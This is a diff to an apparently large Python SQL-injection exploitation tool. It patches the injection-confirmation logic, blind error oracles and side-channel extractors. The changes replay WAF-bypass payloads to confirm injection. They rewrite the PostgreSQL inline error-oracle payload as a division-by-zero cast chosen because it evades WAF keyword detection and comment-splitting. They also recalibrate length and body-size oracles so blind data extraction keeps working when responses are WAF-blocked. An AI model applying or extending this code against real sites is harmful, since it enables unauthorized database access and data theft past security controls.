@@ -105692,6 +105692,35 @@ class TechniqueCascadeEngine:
                                               "not overriding FP guard rejection", _wassr_dist, _wassr_min)
                         except Exception as _wassr_ovr_err:
                             LOG.debug("[PCV] Wasserstein override check error: %s", _wassr_ovr_err)
+                        # FIX-WASSR-DET-NOTES: Fallback — parse detection-time Wasserstein
+                        # distance stored in det.notes. PCV re-probes use fresh canary pairs
+                        # which may all be WAF-blocked (gap=0), but the detection-time probes
+                        # used full NV/WB/EX/HY bypass mutations that BYPASSED the WAF and
+                        # produced a real gap (dist ≥ 0.50 in the log). If the live re-probe
+                        # dist is below the override min, try the stored detection-time dist
+                        # as a second opinion before rejecting.
+                        if not _wassr_override:
+                            try:
+                                _det_notes_str = str(getattr(det, 'notes', '') or '')
+                                if _det_notes_str:
+                                    import re as _re_wn
+                                    _wn_m = _re_wn.search(r'wasserstein_dist=(\d+\.\d+)', _det_notes_str)
+                                    if _wn_m:
+                                        _det_wass_dist = float(_wn_m.group(1))
+                                        _wn_min = max(getattr(
+                                            _GLOBAL_WASSERSTEIN, 'threshold', 0.012) * 2.0, 0.15)
+                                        if _det_wass_dist >= _wn_min:
+                                            _wassr_override = True
+                                            print(f"[+] PCV FP-Guards WASSR OVERRIDE (det-notes) "
+                                                  f"[{tech}→{_effective_tech}] {dbms} "
+                                                  f"det-time-dist={_det_wass_dist:.4f} ≥ {_wn_min:.4f} "
+                                                  "— stored detection-time Wasserstein gap confirms "
+                                                  "injection (PCV canary probes WAF-blocked)", flush=True)
+                                        else:
+                                            LOG.debug("[PCV] det-notes Wasserstein=%.4f below min=%.4f",
+                                                      _det_wass_dist, _wn_min)
+                            except Exception as _wn_err:
+                                LOG.debug("[PCV] det-notes Wasserstein parse error: %s", _wn_err)
                         if _wassr_override:
                             _pcv_ok = True
                             try:
@@ -107919,6 +107948,20 @@ class TechniqueCascadeEngine:
                          or _is_mssql_cast_bool_e
                          or _checke_payload_is_timing
                          or _checke_payload_is_error)
+
+        # FIX-REPLAY-BYPASS-PRECOMPUTE: Pre-compute detection replay BEFORE the Check E block
+        # so it is available for the WAF-bypass confirmation path even when Check E is skipped
+        # (e.g. B/BH/IN techniques, which are in _check_e_skip_techs). The exact detection
+        # bypass payload is replayed here to verify the WAF still accepts it and body changes.
+        _det_fp = None
+        _det_sim = 1.0
+        _det_status = 0
+        if _use_exact_payload and not _timing_only_tech and not _checke_payload_is_timing:
+            try:
+                _det_fp, _det_sim, _det_status, _ = await _pcv_send(payload)
+            except Exception:
+                _det_fp, _det_sim, _det_status = None, 1.0, 0
+
         if not _skip_check_e:
             # USER REQUIREMENT: Use DBMS-specific LONGER valid SQL (not empty, not minimal)
             def _get_check_e_payload(_dbms, numeric_ctx=False):
@@ -107975,7 +108018,9 @@ class TechniqueCascadeEngine:
             #
             # This is immune to CDN noise because the comparison is between two
             # injected responses (not each vs a potentially-cached baseline).
-            _det_fp, _det_sim, _det_status, _ = await _pcv_send(payload)
+            # FIX-REPLAY-BYPASS-PRECOMPUTE: Reuse pre-computed detection replay if available.
+            if _det_fp is None:
+                _det_fp, _det_sim, _det_status, _ = await _pcv_send(payload)
 
             # String-context probe
             _e_str_p = _get_check_e_payload(dbms, numeric_ctx=False)
@@ -108408,7 +108453,51 @@ class TechniqueCascadeEngine:
                 print(f"[*]   [PCV] Check E direct_sim={_e_direct_sim_val:.3f} < 0.88 threshold for WAF-bypass "
                       "standalone confirmation — need timing proof", flush=True)
 
-        #  Check B: Timing Canary with Proportional Delay 
+        # FIX-REPLAY-BYPASS-CONFIRMATION: When all Check A canaries are WAF-blocked AND
+        # the exact detection bypass payload still reaches the DB (non-WAF-block status),
+        # confirm injection using the detection replay as direct evidence.
+        # Rationale: the detection payload used NV/WB/EX/HY structural bypass mutations that
+        # the WAF cannot detect, while plain SUBSTRING/LENGTH canaries are blocked because they
+        # contain recognisable SQL keywords. If the SAME bypass payload STILL changes the response
+        # body (det_sim < threshold) vs the baseline, that directly proves SQL injection is real.
+        # Safety guards:
+        #   1. _use_exact_payload: only fire when we have the reproducible exact bypass payload
+        #   2. _det_status not in WAF_BLOCK: detection replay bypassed the WAF
+        #   3. det_sim < threshold: body genuinely changed (not just CDN/dynamic noise)
+        #   4. Excludes timing/stacked techniques (body unchanged for those)
+        #   5. _check_a_all_waf_blocked: all canaries blocked (not just a few)
+        if (_check_a_all_waf_blocked
+                and not _a_pass
+                and tech not in ("S", "HQ", "T", "BT", "TH", "DS", "SO")
+                and not _timing_only_tech
+                and _use_exact_payload):
+            _det_bypass_ok = (
+                _det_fp is not None
+                and _det_status not in {400, 403, 406, 429, 503}
+                and _det_sim < (1.0 - max(_gap_threshold, 0.25))
+            )
+            if _det_bypass_ok:
+                print(f"[*]   [PCV] Result: CONFIRMED  Detection-replay WAF-bypass "
+                      f"(det_status={_det_status}, det_sim={_det_sim:.3f} < {1.0 - max(_gap_threshold, 0.25):.3f}) "
+                      f"— all {_check_a_waf_counts[1]} Check A canaries WAF-blocked but "
+                      "exact detection payload still bypasses WAF and changes body; "
+                      "injection confirmed [tech={tech} dbms={dbms}]", flush=True)
+                _INJECTION_CONFIRMED[0] = True
+                _SCAN_STOPPED[0] = True
+                return True, 1, _details
+            elif _det_fp is None:
+                print(f"[*]   [PCV] WAF-bypass replay: detection replay failed (no fingerprint); "
+                      "cannot confirm without valid replay", flush=True)
+            elif _det_status in {400, 403, 406, 429, 503}:
+                print(f"[*]   [PCV] WAF-bypass replay: detection replay also WAF-blocked "
+                      f"(status={_det_status}) — bypass technique no longer works; cannot confirm",
+                      flush=True)
+            else:
+                print(f"[*]   [PCV] WAF-bypass replay: bypass worked (status={_det_status}) "
+                      f"but body gap insufficient (det_sim={_det_sim:.3f}, need < "
+                      f"{1.0 - max(_gap_threshold, 0.25):.3f}) — not confirmed", flush=True)
+
+        #  Check B: Timing Canary with Proportional Delay
         _cdn_all_detected = False  # CRITICAL FIX: Track if CDN caching detected (blocks multi-probe fallback)
 
         # BUG-V62-TARGETED-SLEEP-REPLACE-SCOPE-FIX (HIGH, Req 3):
@@ -131148,10 +131237,16 @@ class MultiStrategyExtractor:
             #           gives the same response. The inline error oracle is non-functional for
             #           SQLite; just use the CASE form which is at least syntactically valid.
             if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
-                # BUG-MSE-INLINE-WAF-FIX: original `1/(({cond})::int-1)=1` uses
-                # PostgreSQL-specific `::int` cast which WAFs flag; CASE WHEN is
-                # standard SQL and structurally identical to the Oracle/MSSQL branch.
-                p = self._build_inline(f"1/CASE WHEN ({cond}) THEN 0 ELSE 1 END=1")
+                # FIX-MSE-INLINE-ARITH: Use arith_inline form `1/(({cond})::int-1)=1`
+                # instead of CASE WHEN. The SQLMutationEngine comment-splitter breaks
+                # CASE/WHEN keywords (C/*x*/A/*x*/S/*x*/E is not the keyword CASE in PG)
+                # → both true and false probes produce syntax errors → oracle can't
+                # distinguish. `::int` is a cast OPERATOR, not a keyword — it survives
+                # comment-splitting intact. The WHERE-ERROR oracle uses this same form
+                # (arith_inline strategy) and it demonstrably bypasses WAF on this target.
+                # Logic: cond=True → 1::int=1 → 1-1=0 → 1/0 → ERROR.
+                #        cond=False → 0::int=0 → 0-1=-1 → 1/-1=ok.
+                p = self._build_inline(f"1/(({cond})::int-1)=1")
             elif self.dbms == "Oracle":
                 # CASE WHEN gates the div-zero: true→0→1/0→ORA-01476, false→1→1/1→ok
                 p = self._build_inline(
@@ -133890,6 +133985,17 @@ class SideChannelExtractor:
         elif self._signal_type == "length":
             d_err = abs(_length - self._err_len)
             d_ok = abs(_length - self._ok_len)
+            # FIX-EVAL-WHERE-ERROR-LARGE-NORMAL-RESPONSE: When ok_len was calibrated from a
+            # WAF-block page (small, typically <300B, e.g. 155B) and the current response is a
+            # large normal DB page (no SQL error triggered), the nearest-neighbor comparison
+            # gives the wrong result: a ~1200B normal page is closer to err_len (~557B) than
+            # ok_len (~155B) → returns True even though no error occurred (condition is False).
+            # Correct behaviour: if the response is much larger than both calibrated lengths
+            # AND ok_len is small (WAF-block-page sized), the DB returned a normal page because
+            # no SQL error was triggered → condition is False.
+            _larger_cal = max(self._err_len, self._ok_len)
+            if self._ok_len < 300 and _length > _larger_cal * 1.5 and _length > 500:
+                return False  # large normal DB page = no error = condition is False
             return d_err < d_ok
         elif self._signal_type == "header":
             # BUG-SCE-HEADER-EXACT-MATCH FIX: Previously used exact equality
@@ -163919,13 +164025,37 @@ class ConditionalErrorOracle:
                         _f_body_raw = (getattr(_fp_f, 'text', '') or '')
                         _f_body_len = len(_f_body_raw)
                         _body_size_diff = abs(_t_body_len - _f_body_len)
+                        # FIX-CEO-BASELINE-WAF: When baseline itself is WAF-blocked
+                        # (self._baseline_status is a WAF-block code), the true probe
+                        # returning a WAF challenge page is expected and not a reason to
+                        # skip — the WAF blocks the baseline too. Only apply the challenge-
+                        # page guard when the baseline was a normal response (non-WAF).
+                        _baseline_is_waf = self._baseline_status in {400, 403, 406, 429, 503}
                         if (_t_body_len > 400 and any(sig in _t_body_waf for sig in _waf_sigs)
-                                and _body_size_diff < 100):
+                                and _body_size_diff < 100
+                                and not _baseline_is_waf):
                             print(f"[!] [ErrorOracle] True probe body looks like WAF challenge page "
                                   f"(status={_t_st}, size={_t_body_len}B) — skipping template to avoid false-positive "
                                   f"oracle (ctx={_prefix!r} tpl={tpl[:40]!r})",
                                   flush=True)
                             continue
+                        # FIX-CEO-BASELINE-WAF (body-size path): When baseline is WAF-blocked
+                        # AND both probes return the same WAF status but with meaningfully
+                        # different body sizes, the WAF is discriminating on SQL content →
+                        # use body-size mode as the oracle signal.
+                        if (_baseline_is_waf
+                                and _t_st == self._baseline_status
+                                and _f_st == _t_st
+                                and _body_size_diff >= 100):
+                            self._working_template = tpl
+                            self._working_prefix = _prefix
+                            self._body_size_oracle = True
+                            self._true_oracle_size = _t_body_len
+                            self._false_oracle_size = _f_body_len
+                            print("[+] [ErrorOracle] Calibrated (body-size mode, WAF-blocked baseline): "
+                                  f"true={_t_body_len}B vs false={_f_body_len}B "
+                                  f"(ctx={_prefix!r} template: {tpl[:40]}...)", flush=True)
+                            return True
                         _ceo_cal_waf = {400, 403, 406, 429, 430, 503}
                         if (_t_st in _ceo_cal_waf and _t_st < 500
                                 and _t_st != self._baseline_status):
